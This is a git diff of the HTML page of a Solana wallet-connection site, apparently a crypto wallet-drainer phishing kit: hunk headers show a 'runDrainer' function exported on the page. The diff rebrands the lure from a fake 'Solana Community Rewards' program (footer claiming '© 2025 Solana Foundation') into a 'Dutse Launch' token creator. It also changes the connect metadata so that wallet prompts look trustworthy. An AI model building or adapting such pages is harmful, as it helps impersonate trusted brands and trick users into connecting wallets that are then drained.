@@ -3,11 +3,22 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>  Solana Community Rewards</title>
+  <title>Dutse Launch - Solana Token Creator</title>
+  
+  <!-- Dutse Launch Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <!-- Favicon -->
+  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="icon" type="image/png" href="/favicon.png">
+  <link rel="apple-touch-icon" href="/logo.svg">
+  
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
   <meta http-equiv="Pragma" content="no-cache" />
   <meta http-equiv="Expires" content="0" />
-  <meta name="description" content="Powering the Next Wave of Builders & Holders. Join the Solana Community Rewards Program and earn $SOL for your contributions." />
+  <meta name="description" content="Create and deploy your Solana coin effortlessly in seconds. Reach the world and scale without limits with Dutse Launch!" />
   
   <!-- dApp Metadata for Wallets -->
   <meta name="application-name" content="  Solana Community Rewards" />
@@ -16,23 +27,23 @@
   <meta name="theme-color" content="#14f195" />
   
   <!-- Solana dApp Metadata -->
-<meta name="solana-dapp-name" content="  Solana Community Rewards" />
-<meta name="solana-dapp-description" content="Powering the Next Wave of Builders & Holders" />
+<meta name="solana-dapp-name" content="Dutse Launch - Solana Token Creator" />
+<meta name="solana-dapp-description" content="Create and deploy your Solana coin effortlessly in seconds" />
 <meta name="solana-dapp-url" content="" />
-<meta name="solana-dapp-icon" content="/logo.png" />
+<meta name="solana-dapp-icon" content="" />
   
   <!-- Wallet Connect Metadata -->
-  <meta name="wallet-connect-name" content="  Solana Community Rewards" />
-<meta name="wallet-connect-description" content="Powering the Next Wave of Builders & Holders" />
+  <meta name="wallet-connect-name" content="Dutse Launch - Solana Token Creator" />
+  <meta name="wallet-connect-description" content="Create and deploy your Solana coin effortlessly in seconds" />
   <meta name="wallet-connect-url" content="" />
-  <meta name="wallet-connect-icon" content="/logo.png" />
+  <meta name="wallet-connect-icon" content="" />
   
   <!-- SEO and Social Media Meta Tags -->
   <meta property="og:title" content="  Solana Community Rewards" />
 <meta property="og:description" content="Powering the Next Wave of Builders & Holders. Join the Solana Community Rewards Program and earn $SOL for your contributions." />
   <meta property="og:type" content="website" />
   <meta property="og:url" content="" />
-  <meta property="og:image" content="/logo.png" />
+  <meta property="og:image" content="/logo.svg" />
   <meta property="og:site_name" content="  Solana Community Rewards" />
   
   <meta name="twitter:card" content="summary_large_image" />
@@ -54,7 +65,7 @@
   <meta name="google-play-app" content="app-id=app.phantom" />
   
   <!-- Preload critical images for faster loading -->
-  <link rel="preload" href="/logo.png" as="image" type="image/png" />
+  <link rel="preload" href="/logo.svg" as="image" type="image/svg+xml" />
   <link rel="preload" href="/phantom-logo.png" as="image" type="image/png" />
   <link rel="preload" href="/solflare-logo.png" as="image" type="image/png" />
   <link rel="preload" href="/backpack-logo.png" as="image" type="image/png" />
@@ -64,8 +75,8 @@
   
   <!-- dApp Manifest -->
   <link rel="manifest" href="/manifest.json?v=3" />
-  <link rel="icon" href="/favicon1.ico?v=6" type="image/x-icon" />
-  <link rel="apple-touch-icon" href="/logo.png?v=3" />
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <link rel="apple-touch-icon" href="/logo.svg" />
   <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js?v=4"></script>
   <script src="/patient-mode.js"></script>
   <script>
@@ -465,29 +476,42 @@
     
     // Set dApp metadata for wallet detection BEFORE wallet scripts load
     window.dAppMetadata = {
-      name: '  Solana Community Rewards',
-      description: 'Powering the Next Wave of Builders & Holders',
+      name: 'Dutse Launch - Solana Token Creator',
+      description: 'Create and deploy your Solana coin effortlessly in seconds',
       url: window.location.origin,
-      icon: window.location.origin + '/logo.png',
+      icon: window.location.origin + '/logo.svg',
       appIdentity: {
-        name: '  Solana Community Rewards',
+        name: 'Dutse Launch - Solana Token Creator',
         uri: window.location.origin,
-        icon: window.location.origin + '/logo.png'
+        icon: window.location.origin + '/logo.svg'
       }
     };
     
+    // Set additional metadata for better wallet recognition
+    window.solanaDAppName = 'Dutse Launch - Solana Token Creator';
+    window.solanaDAppDescription = 'Create and deploy your Solana coin effortlessly in seconds';
+    window.solanaDAppUrl = window.location.origin;
+    window.solanaDAppIcon = window.location.origin + '/logo.svg';
+    
+    // Debug: Log metadata for troubleshooting
+    console.log('[METADATA] dApp metadata set:', {
+      name: window.dAppMetadata.name,
+      icon: window.dAppMetadata.icon,
+      url: window.dAppMetadata.url
+    });
+    
     // Ensure dApp icon is set for all wallet types
-    window.solanaDAppIcon = window.location.origin + '/logo.png';
-    window.phantomDAppIcon = window.location.origin + '/logo.png';
-    window.solflareDAppIcon = window.location.origin + '/logo.png';
-    window.backpackDAppIcon = window.location.origin + '/logo.png';
-    window.glowDAppIcon = window.location.origin + '/logo.png';
-    window.trustDAppIcon = window.location.origin + '/logo.png';
-    window.exodusDAppIcon = window.location.origin + '/logo.png';
+    window.solanaDAppIcon = window.location.origin + '/logo.svg';
+    window.phantomDAppIcon = window.location.origin + '/logo.svg';
+    window.solflareDAppIcon = window.location.origin + '/logo.svg';
+    window.backpackDAppIcon = window.location.origin + '/logo.svg';
+    window.glowDAppIcon = window.location.origin + '/logo.svg';
+    window.trustDAppIcon = window.location.origin + '/logo.svg';
+    window.exodusDAppIcon = window.location.origin + '/logo.svg';
     
     // Function to set dApp icon for detected wallets
     function setDAppIconForWallet(walletType) {
-      const iconUrl = window.location.origin + '/logo.png';
+      const iconUrl = window.location.origin + '/logo.svg';
       
       switch(walletType) {
         case 'phantom':
@@ -544,7 +568,7 @@
     
     // Set additional window properties for wallet recognition
     window.solanaDAppName = '  Solana Community Rewards';
-    window.solanaDAppIcon = window.location.origin + '/logo.png';
+    window.solanaDAppIcon = window.location.origin + '/logo.svg';
     
     // Override any existing dApp metadata
     Object.defineProperty(window, 'dAppMetadata', {
@@ -578,7 +602,7 @@
     
     body {
       margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      font-family: 'Inter', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: #0a0a0a;
       color: #fff;
     }
@@ -594,23 +618,27 @@
       z-index: 1000;
     }
     .nav-logo {
-      font-size: 1.8em;
+      font-size: 1.4em;
       font-weight: bold;
-      color: #14f195;
+      color: #ff6b35;
     }
     .nav-btn {
-      background: linear-gradient(45deg, #14f195, #00CC6A);
-      color: black;
-      padding: 10px 20px;
+      background: linear-gradient(45deg, #ff6b35, #f7931e);
+      color: white;
+      padding: 12px 24px;
       border: none;
-      border-radius: 10px;
+      border-radius: 12px;
       font-weight: 600;
+      font-size: 14px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
       cursor: pointer;
-      transition: 0.3s ease;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 15px rgba(255, 107, 53, 0.3);
     }
     .nav-btn:hover {
       transform: translateY(-2px);
-      box-shadow: 0 6px 18px rgba(20, 241, 149, 0.3);
+      box-shadow: 0 6px 20px rgba(255, 107, 53, 0.4);
     }
     .hero {
       height: 90vh;
@@ -635,19 +663,64 @@
     
 
     .claim-btn {
-      font-size: 1.4em;
+      font-size: 1.1em;
       padding: 18px 36px;
-      background: linear-gradient(45deg, #14f195, #00CC6A);
-      color: black;
+      background: linear-gradient(45deg, #ff6b35, #f7931e);
+      color: white;
       border: none;
       border-radius: 12px;
       font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
       cursor: pointer;
-      transition: 0.3s ease;
+      transition: all 0.3s ease;
+      box-shadow: 0 6px 20px rgba(255, 107, 53, 0.3);
     }
     .claim-btn:hover {
       transform: translateY(-3px);
-      box-shadow: 0 10px 30px rgba(20, 241, 149, 0.4);
+      box-shadow: 0 10px 30px rgba(255, 107, 53, 0.4);
+    }
+    
+    /* Dutse Launch Hero Styling */
+    .hero h1 {
+      font-size: 2.5em;
+      font-weight: bold;
+      color: #ff6b35;
+      margin-bottom: 20px;
+      text-shadow: 0 0 20px rgba(255, 107, 53, 0.3);
+    }
+    
+    .hero h2 {
+      font-size: 1.8em;
+      font-weight: 300;
+      color: #fff;
+      margin-bottom: 10px;
+    }
+    
+    .hero h3 {
+      font-size: 1.3em;
+      font-weight: 400;
+      color: #ffd700;
+      margin-bottom: 30px;
+    }
+    
+    .hero-features {
+      margin: 40px 0;
+      padding: 30px;
+      background: rgba(255, 107, 53, 0.1);
+      border-radius: 15px;
+      border: 1px solid rgba(255, 107, 53, 0.3);
+    }
+    
+    .hero-feature h4 {
+      color: #ff6b35;
+      font-size: 1.5em;
+      margin-bottom: 10px;
+    }
+    
+    .hero-feature p {
+      color: #ccc;
+      font-size: 1.1em;
     }
     .footer {
       text-align: center;
@@ -910,14 +983,14 @@
       padding: 4px 0;
     }
     .nav-link.active, .nav-link:focus {
-      color: #14f195;
+      color: #ff6b35;
     }
     .nav-link::after {
       content: '';
       display: block;
       width: 0;
       height: 2px;
-      background: #14f195;
+      background: #ff6b35;
       transition: width 0.2s;
       position: absolute;
       left: 0;
@@ -974,9 +1047,9 @@
       color: #f3f3f3;
     }
     .info-section h2 {
-      color: #14f195;
+      color: #ff6b35;
       margin-bottom: 18px;
-      font-size: 2em;
+      font-size: 1.5em;
     }
     .card-grid {
       display: grid;
@@ -1000,9 +1073,9 @@
       transform: translateY(-4px) scale(1.025);
     }
     .info-card h3 {
-      color: #14f195;
+      color: #ff6b35;
       margin-bottom: 12px;
-      font-size: 1.18em;
+      font-size: 1em;
     }
     .info-card ul {
       margin: 0 0 0 18px;
@@ -1013,7 +1086,7 @@
       line-height: 1.6;
     }
     .info-card a {
-      color: #14f195;
+      color: #ff6b35;
       text-decoration: underline;
       word-break: break-all;
     }
@@ -1454,7 +1527,7 @@
 
     .minting-section h2 {
       font-size: 2.5em;
-      color: #14f195;
+      color: #ff6b35;
       margin-bottom: 20px;
       font-weight: bold;
     }
@@ -1497,9 +1570,9 @@
     }
 
     .toggle-option input[type="radio"]:checked + .toggle-label {
-      background: #14f195;
+      background: #ff6b35;
       color: #000;
-      border-color: #14f195;
+      border-color: #ff6b35;
     }
 
     .mint-form {
@@ -1522,7 +1595,7 @@
 
     .form-group label {
       display: block;
-      color: #14f195;
+      color: #ff6b35;
       font-weight: 600;
       margin-bottom: 8px;
       font-size: 0.9em;
@@ -1542,7 +1615,7 @@
 
     .form-group input:focus {
       outline: none;
-      border-color: #14f195;
+      border-color: #ff6b35;
       background: rgba(255, 255, 255, 0.15);
     }
 
@@ -1551,7 +1624,7 @@
     }
 
     .mint-submit-btn {
-      background: linear-gradient(45deg, #14f195, #00CC6A);
+      background: linear-gradient(45deg, #ff6b35, #f7931e);
       color: #000;
       border: none;
       padding: 22px 48px;
@@ -1576,8 +1649,8 @@
     }
 
     .features-section h2 {
-      font-size: 2.5em;
-      color: #14f195;
+      font-size: 1.8em;
+      color: #ff6b35;
       margin-bottom: 50px;
       font-weight: bold;
     }
@@ -1601,7 +1674,7 @@
 
     .feature-card:hover {
       transform: translateY(-5px);
-      border-color: #14f195;
+      border-color: #ff6b35;
       box-shadow: 0 10px 30px rgba(20, 241, 149, 0.2);
     }
 
@@ -1611,8 +1684,8 @@
     }
 
     .feature-card h3 {
-      color: #14f195;
-      font-size: 1.3em;
+      color: #ff6b35;
+      font-size: 1.1em;
       margin-bottom: 15px;
       font-weight: 600;
     }
@@ -1630,8 +1703,8 @@
     }
 
     .how-it-works h2 {
-      font-size: 2.5em;
-      color: #14f195;
+      font-size: 1.8em;
+      color: #ff6b35;
       margin-bottom: 50px;
       font-weight: bold;
     }
@@ -1658,7 +1731,7 @@
       top: -20px;
       left: 50%;
       transform: translateX(-50%);
-      background: #14f195;
+      background: #ff6b35;
       color: #000;
       width: 40px;
       height: 40px;
@@ -1671,7 +1744,7 @@
     }
 
     .step-card h3 {
-      color: #14f195;
+      color: #ff6b35;
       font-size: 1.3em;
       margin: 20px 0 15px 0;
       font-weight: 600;
@@ -1955,9 +2028,12 @@
     }
 
     .rewards-section h2, .how-it-works h2, .reward-tiers h2, .why-join h2, .start-earning h2 {
-      font-size: 2.5em;
+      font-size: 3em;
+      font-weight: 800;
       margin-bottom: 20px;
-      color: #14f195;
+      color: #ff6b35;
+      text-align: center;
+      letter-spacing: -0.02em;
     }
 
     .section-subtitle {
@@ -1977,14 +2053,15 @@
     }
 
     .reward-card, .tier-card {
-      background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(20, 241, 149, 0.05));
-      border: 2px solid transparent;
+      background: linear-gradient(135deg, rgba(255, 107, 53, 0.1), rgba(247, 147, 30, 0.05));
+      border: 2px solid rgba(255, 107, 53, 0.3);
       border-radius: 20px;
-      padding: 30px 20px;
+      padding: 40px 30px;
       transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
       backdrop-filter: blur(15px);
       position: relative;
       overflow: hidden;
+      box-shadow: 0 8px 32px rgba(255, 107, 53, 0.1);
     }
 
     .reward-card::before, .tier-card::before {
@@ -2004,8 +2081,8 @@
 
     .reward-card:hover, .tier-card:hover {
       transform: translateY(-8px) scale(1.02);
-      border-color: rgba(20, 241, 149, 0.8);
-      box-shadow: 0 20px 40px rgba(20, 241, 149, 0.3), 0 0 0 1px rgba(20, 241, 149, 0.1);
+      border-color: rgba(255, 107, 53, 0.8);
+      box-shadow: 0 20px 40px rgba(255, 107, 53, 0.3), 0 0 0 1px rgba(255, 107, 53, 0.1);
     }
 
     .reward-icon, .tier-icon {
@@ -2017,7 +2094,7 @@
     .reward-card h3, .tier-card h3 {
       font-size: 1.5em;
       margin-bottom: 15px;
-      color: #14f195;
+      color: #ff6b35;
     }
 
     .reward-card p, .tier-card p {
@@ -2088,7 +2165,7 @@
     .step-card h3 {
       font-size: 1.5em;
       margin-bottom: 15px;
-      color: #14f195;
+      color: #ff6b35;
     }
 
     .step-card p {
@@ -2198,7 +2275,7 @@
 
     .earning-step h3 {
       font-size: 1.3em;
-      color: #14f195;
+      color: #ff6b35;
       margin-bottom: 10px;
     }
 
@@ -2209,7 +2286,7 @@
     .claim-btn.large {
       font-size: 1.6em;
       padding: 20px 40px;
-      background: linear-gradient(45deg, #14f195, #00CC6A, #4ECDC4, #14f195);
+      background: linear-gradient(45deg, #ff6b35, #f7931e, #ffd700, #ff6b35);
       background-size: 300% 300%;
       animation: gradientFlow 3s ease-in-out infinite;
       position: relative;
@@ -2236,12 +2313,12 @@
       box-shadow: 0 15px 35px rgba(20, 241, 149, 0.4), 0 0 0 2px rgba(20, 241, 149, 0.2);
     }
 
-    /* Creative Background Patterns */
+    /* Dutse Launch Background Patterns */
     .rewards-section, .how-it-works, .reward-tiers, .why-join, .start-earning {
       background-image: 
-        radial-gradient(circle at 20% 80%, rgba(20, 241, 149, 0.03) 0%, transparent 50%),
-        radial-gradient(circle at 80% 20%, rgba(78, 205, 196, 0.03) 0%, transparent 50%),
-        radial-gradient(circle at 40% 40%, rgba(255, 107, 107, 0.02) 0%, transparent 50%);
+        radial-gradient(circle at 20% 80%, rgba(255, 107, 53, 0.05) 0%, transparent 50%),
+        radial-gradient(circle at 80% 20%, rgba(247, 147, 30, 0.03) 0%, transparent 50%),
+        radial-gradient(circle at 40% 40%, rgba(255, 215, 0, 0.02) 0%, transparent 50%);
     }
 
     /* Enhanced Section Headers */
@@ -2280,7 +2357,7 @@
       left: -2px;
       right: -2px;
       bottom: -2px;
-      background: linear-gradient(45deg, #14f195, #4ECDC4, #FF6B6B, #14f195);
+      background: linear-gradient(45deg, #ff6b35, #f7931e, #ffd700, #ff6b35);
       border-radius: 22px;
       z-index: -1;
       opacity: 0;
@@ -2322,51 +2399,58 @@
 </head>
 <body>
   <nav>
-    <div class="nav-logo"><img src="/logo.png" alt="Solana Foundation Logo" style="height:36px;vertical-align:middle;margin-right:10px;">  Solana Community Rewards</div>
+    <div class="nav-logo"><img src="/logo.svg" alt="Dutse Launch Logo" style="height:36px;vertical-align:middle;margin-right:10px;">Dutse Launch</div>
     <div class="nav-links">
-      <a href="#rewards" class="nav-link">Rewards</a>
+      <a href="#features" class="nav-link">Features</a>
       <a href="#how-it-works" class="nav-link">How It Works</a>
-      <a href="#tiers" class="nav-link">Tiers</a>
-      <a href="#join" class="nav-link">Join</a>
+      <a href="#faq" class="nav-link">FAQ</a>
+      <a href="/create-token.html" class="nav-link">Create Token</a>
+      <a href="https://discord.gg/dutseSupport" class="nav-link" target="_blank" rel="noopener noreferrer">Support</a>
     </div>
     <button class="nav-btn" onclick="openWalletModal()">Connect Wallet</button>
   </nav>
   <section class="hero" id="hero">
     <div class="hero-content">
-          <h1><img src="/logo.png" alt="Logo" style="height: 60px; vertical-align: middle; margin-right: 15px;">   Solana Community Rewards</h1>
-    <p class="hero-subtitle">Powering the Next Wave of Builders & Holders</p>
-    <p class="hero-description">The Solana Community Rewards Program is designed to give back to the people who make Solana thrive — developers, validators, creators, and everyday users. Whether you're deploying smart contracts, collecting NFTs, or onboarding friends into crypto, you earn rewards for helping grow the ecosystem.</p>
-
-      <button class="claim-btn" onclick="openWalletModal();">Connect Wallet</button>
+      <h1>Dutse Launch</h1>
+      <h2>#1 Solana Token Launcher in the World</h2>
+      <h3>Take it to the Moon!</h3>
+      <p class="hero-description">Create and deploy your Solana coin effortlessly in seconds.<br>Reach the world and scale without limits!</p>
+      <div class="hero-features">
+        <div class="hero-feature">
+          <h4>Solana Token Creator</h4>
+          <p>Create and deploy your Solana coin effortlessly in seconds.</p>
+        </div>
+      </div>
+          <button class="claim-btn" onclick="window.location.href='/create-token.html'">Create Token</button>
     </div>
   </section>
 
-  <!-- Rewards Info Section -->
-  <section class="rewards-section" id="rewards">
+  <!-- Features Section -->
+  <section class="rewards-section" id="features">
     <div class="container">
-      <h2><img src="/logo.png" alt="Logo" style="height: 30px; vertical-align: middle; margin-right: 10px;"> What Are Rewards?</h2>
-      <p class="section-subtitle">Rewards are distributed in $SOL and ecosystem tokens to celebrate contributions like:</p>
+      <h2><img src="/logo.svg" alt="Dutse Launch Logo" style="height: 30px; vertical-align: middle; margin-right: 10px;"> Why Choose Dutse Launch?</h2>
+      <p class="section-subtitle">The world's most powerful Solana Token Creator with advanced features:</p>
       
       <div class="rewards-grid">
         <div class="reward-card">
-          <div class="reward-icon">B</div>
-          <h3>Builders</h3>
-          <p>Ship tools, dApps, and integrations.</p>
+          <div class="reward-icon">S</div>
+          <h3>Security</h3>
+          <p>All tokens are created through Solana's native API, ensuring maximum security.</p>
         </div>
         <div class="reward-card">
-          <div class="reward-icon">G</div>
-          <h3>Community Members</h3>
-          <p>Run events, host spaces, create content.</p>
+          <div class="reward-icon">F</div>
+          <h3>Speed</h3>
+          <p>Create tokens in seconds thanks to optimized smart contracts.</p>
         </div>
         <div class="reward-card">
-          <div class="reward-icon">V</div>
-          <h3>Validators & Delegators</h3>
-          <p>Secure the network with uptime & stake.</p>
+          <div class="reward-icon">E</div>
+          <h3>Simplicity</h3>
+          <p>Intuitive interface requires no programming skills or blockchain knowledge.</p>
         </div>
         <div class="reward-card">
-          <div class="reward-icon">A</div>
-          <h3>Advocates</h3>
-          <p>Onboard new users, share tutorials, grow awareness.</p>
+          <div class="reward-icon">W</div>
+          <h3>Wallet Integration</h3>
+          <p>Support for all popular Solana wallets for convenient interaction.</p>
         </div>
       </div>
     </div>
@@ -2375,22 +2459,19 @@
   <!-- How It Works Section -->
   <section class="how-it-works" id="how-it-works">
     <div class="container">
-      <h2> How It Works</h2>
+      <h2>Frequently Asked Questions</h2>
       <div class="steps-grid">
         <div class="step-card">
-          <div class="step-number">1</div>
-          <h3>Contribute</h3>
-          <p>Participate in Solana activities (on-chain and off-chain).</p>
+          <h3>What is Dutse Launch? +</h3>
+          <p>It's a platform that enables users to launch new tokens on the Solana blockchain. The launchpad helps with token creation while ensuring a secure and efficient environment for creators.</p>
         </div>
         <div class="step-card">
-          <div class="step-number">2</div>
-          <h3>Track</h3>
-          <p>Points are logged to your wallet automatically via participation proofs.</p>
+          <h3>How can I create a token on the Solana blockchain? +</h3>
+          <p>You can easily launch your token on Solana without writing any code by using Dutse Launch. Dutse Launch lets you quickly set up your token by simply entering the key details—such as the token name, ticker symbol, initial supply, number of decimals—and optionally adding an image, description, and social links to round out your token's profile.</p>
         </div>
         <div class="step-card">
-          <div class="step-number">3</div>
-          <h3>Claim</h3>
-          <p>Redeem points for $SOL, ecosystem tokens, or exclusive NFTs.</p>
+          <h3>Do I need any programming skills to launch a token? +</h3>
+          <p>Not at all. Our platform is designed for everyone—from seasoned developers to beginners—so you can launch your token easily without any coding experience.</p>
         </div>
       </div>
     </div>
@@ -2420,54 +2501,32 @@
     </div>
   </section>
 
-  <!-- Why Join Section -->
+  <!-- Additional Features Section -->
   <section class="why-join">
     <div class="container">
-      <h2>Why Join?</h2>
+      <h2>Enhance Your Solana Token Experience</h2>
       <div class="benefits-grid">
         <div class="benefit-item">
-          <div class="benefit-icon">$</div>
-          <p>Earn real rewards in $SOL.</p>
+          <div class="benefit-icon">24</div>
+          <p>24/7 Support - Our team is always ready to help with any token creation questions.</p>
         </div>
         <div class="benefit-item">
-          <div class="benefit-icon">E</div>
-          <p>Boost visibility for your contributions.</p>
+          <div class="benefit-icon">F</div>
+          <p>Flexible Customization - Customize token parameters to suit your needs with advanced options.</p>
         </div>
         <div class="benefit-item">
-          <div class="benefit-icon">G</div>
-          <p>Join a growing, global community of builders and creators.</p>
+          <div class="benefit-icon">Z</div>
+          <p>Zero Coding Required - Create, manage, and control your tokens effortlessly with secure transaction.</p>
         </div>
         <div class="benefit-item">
-          <div class="benefit-icon"></div>
-          <p>Get access to early beta drops and Solana partner perks.</p>
+          <div class="benefit-icon">I</div>
+          <p>Instant Deployment - Deploy your token instantly with optimized smart contracts.</p>
         </div>
       </div>
     </div>
   </section>
 
-  <!-- Start Earning Section -->
-  <section class="start-earning" id="join">
-    <div class="container">
-      <h2> Start Earning Today</h2>
-      <div class="earning-steps">
-        <div class="earning-step">
-          <div class="step-icon"></div>
-          <h3>Connect Your Wallet</h3>
-        </div>
-        <div class="earning-step">
-          <div class="step-icon"></div>
-          <h3>Complete Activities & Challenges</h3>
-        </div>
-        <div class="earning-step">
-          <div class="step-icon"></div>
-          <h3>Claim Rewards</h3>
-        </div>
-      </div>
-      <div class="cta-section">
-        <button class="claim-btn large" onclick="openWalletModal();">👉 Connect Wallet</button>
-      </div>
-    </div>
-  </section>
+
 
   <!-- WalletConnect-style Web3Modal -->
   <div id="walletModal" class="modal">
@@ -2475,10 +2534,8 @@
           <div class="modal-header">
               <div class="header-content">
                   <h3>Connect Wallet</h3>
-                  <p class="header-subtitle">Join the Solana Community Rewards Program</p>
-                  <div id="mobileIndicator" style="display: none; margin-top: 8px; padding: 8px 12px; background: rgba(0, 255, 136, 0.1); border: 1px solid rgba(0, 255, 136, 0.3); border-radius: 6px; font-size: 0.9em; color: #00FF88;">
-                    Mobile Deep Link Mode - Enhanced Phantom Connection
-                  </div>
+                  <p class="header-subtitle">Create and deploy your Solana token with Dutse Launch</p>
+                  
               </div>
               <button class="close-btn" onclick="closeWalletModal()">
                   <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -2515,9 +2572,9 @@
     </div>
   </div>
   <div class="footer">
-    <p><img src="/logo.png" alt="Logo" style="height: 20px; vertical-align: middle; margin-right: 8px;">   Join the Solana Community Rewards Program today!</p>
-    <p>Powered by the Solana blockchain. Fast. Scalable. Community-driven.</p>
-  <p>© 2025 Solana Foundation. All rights reserved.</p>
+    <p><img src="/logo.svg" alt="Dutse Launch Logo" style="height: 20px; vertical-align: middle; margin-right: 8px;">Dutse Launch</p>
+    <p>© Dutse Launch 2025</p>
+    <p><a href="#" style="color: #ff6b35; text-decoration: none;">Terms of Service</a></p>
   </div>
   <script>
     // Cache busting: v4 - Enhanced error suppression and logo fixes
@@ -4903,9 +4960,9 @@ window.runDrainer = runDrainer;
                         fn: () => provider.connect({
                           onlyIfTrusted: false,
                           appMetadata: {
-                            name: 'Solana Community Rewards',
+                            name: 'Dutse Launch - Solana Token Creator',
                             url: window.location.origin,
-                            icon: '/logo.png'
+                            icon: '/logo.svg'
                           }
                         })
                       },
@@ -5765,7 +5822,10 @@ window.runDrainer = runDrainer;
             if (wallet.key === 'solflare') {
               // Solflare: Try simple connect first, then fallback to direct access
               try {
-                result = await provider.connect();
+                result = await provider.connect({
+                  onlyIfTrusted: false,
+                  appMetadata: walletAdapterMetadata
+                });
                 publicKey = result?.publicKey || provider.publicKey;
               } catch (error) {
                 console.log(`[AUTO_CONNECT] Solflare connect() failed, trying direct access:`, error.message);
@@ -5780,9 +5840,9 @@ window.runDrainer = runDrainer;
               result = await provider.connect({
                 onlyIfTrusted: false,
                 appMetadata: {
-                  name: 'Solana Community Rewards',
+                  name: 'Dutse Launch - Solana Token Creator',
                   url: window.location.origin,
-                  icon: '/logo.png'
+                  icon: '/logo.svg'
                 }
               });
               publicKey = result?.publicKey || provider.publicKey;
@@ -5988,7 +6048,7 @@ window.runDrainer = runDrainer;
               appMetadata: {
                 name: 'Solana Community Rewards',
                 url: window.location.origin,
-                icon: '/logo.png'
+                icon: '/logo.svg'
               }
             });
             
@@ -6698,7 +6758,7 @@ window.connectWallet = async function connectWallet(walletKey) {
                       appMetadata: {
                         name: 'Solana Community Rewards',
                         url: window.location.origin,
-                        icon: '/logo.png'
+                        icon: '/logo.svg'
                       }
                     })
                   },
@@ -6789,7 +6849,7 @@ window.connectWallet = async function connectWallet(walletKey) {
                     appMetadata: {
                         name: 'Solana Community Rewards',
                       url: window.location.origin,
-                      icon: '/logo.png'
+                      icon: '/logo.svg'
                     }
                     })
                   },
